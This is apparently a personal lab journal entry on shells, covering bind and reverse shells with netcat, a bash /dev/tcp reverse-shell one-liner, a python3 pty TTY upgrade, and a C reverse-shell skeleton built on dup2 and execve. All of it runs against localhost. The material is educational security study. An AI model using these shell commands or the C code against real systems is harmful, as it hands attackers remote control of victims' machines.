# Day 2 — Shells

## What this day is about
Getting a shell on a target is the goal of most attacks. Once you have a shell, you have control — run commands, move files, pivot. This day covers the two main shell types, how to upgrade a dumb shell, and what a compiled C reverse shell looks like under the hood.

---

## Bind Shell vs Reverse Shell

**Bind shell** — the victim listens, you connect to it.
- Victim runs a listener and waits
- You connect to it using the victim's IP and port
- Rarely works in real engagements — firewalls block inbound connections

**Reverse shell** — you listen, the victim connects back to you.
- You set up the listener on your machine
- Victim reaches out to you
- Works because outbound connections are almost never blocked

---

## Bind Shell with Netcat

```bash
# Victim
nc -nvlp 4444 -e /bin/bash

# Attacker
nc 127.0.0.1 4444
```

<!-- SCREENSHOT 2: victim terminal showing nc -nvlp 4444 -e /bin/bash listening and receiving connection -->

<!-- SCREENSHOT 1: attacker terminal showing id command output with full uid/groups -->

---

## Reverse Shell with Netcat

```bash
# Attacker (listens first)
nc -nvlp 4444

# Victim (calls back)
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
```

**Important — zsh doesn't support /dev/tcp.** My default shell is zsh and running the command directly in zsh fails with `no such file or directory`. Always invoke bash explicitly with `bash -c '...'`.

<!-- SCREENSHOT 3: zsh error — no such file or directory: /dev/tcp/127.0.0.1/4444 -->

Once you call bash explicitly it works:

<!-- SCREENSHOT 4: both terminals — listener got connection, victim ran bash -c command -->

Running commands through the reverse shell:

<!-- SCREENSHOT 5: id and whoami responses coming back through the shell -->

---

## TTY Upgrade

A raw netcat shell is dumb — no tab completion, no arrow keys, Ctrl+C kills the whole session, sudo won't work. Upgrading to a full TTY fixes all of that.

```bash
# Step 1 — run inside the reverse shell (the nc listener terminal)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2 — Ctrl+Z to background the shell

# Step 3 — run on your LOCAL terminal
stty raw -echo; fg

# Step 4 — press Enter twice, then run inside the shell
export TERM=xterm
```

**Mistake I made:** ran the python3 command in my local terminal instead of inside the reverse shell. Got `hostnamepython3: command not found`. The pty spawn has to run where the shell landed — inside the nc listener terminal.

<!-- SCREENSHOT 6: hostnamepython3 command not found error -->

---

## C Reverse Shell

Compiled and ran `shell.c` from the repo — a raw C reverse shell that creates a socket, connects back, and hands over `/bin/sh`.

```bash
gcc -o shell shell.c
./shell 127.0.0.1 4444
```

<!-- SCREENSHOT 7: Terminal 2 showing gcc compile and ./shell 127.0.0.1 4444 running -->

<!-- SCREENSHOT 8: Terminal 1 showing connection received and id output -->

How it works under the hood:

```c
int sockfd = socket(AF_INET, SOCK_STREAM, 0);   // create TCP socket
connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));  // connect to attacker

for (int i = 0; i < 3; i++) {
    dup2(sockfd, i);  // redirect stdin(0), stdout(1), stderr(2) to socket
}

execve("/bin/sh", NULL, NULL);  // replace process with a shell
```

`dup2` is the key — it rewires stdin, stdout, and stderr to the network socket so all I/O flows over the connection. Then `execve` spawns `/bin/sh` and the attacker has a shell.

---

## Key Takeaways

- Reverse shells over bind shells — always
- `/dev/tcp` is bash-only — zsh, sh, and dash don't support it
- Raw nc shells are not interactive — always upgrade with python3 pty
- TTY upgrade commands go inside the reverse shell, not your local terminal
- `dup2` + `execve` is the core pattern behind every socket-based shell

---

## Resources
- [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [revshells.com](https://revshells.com) — reverse shell one-liner generator
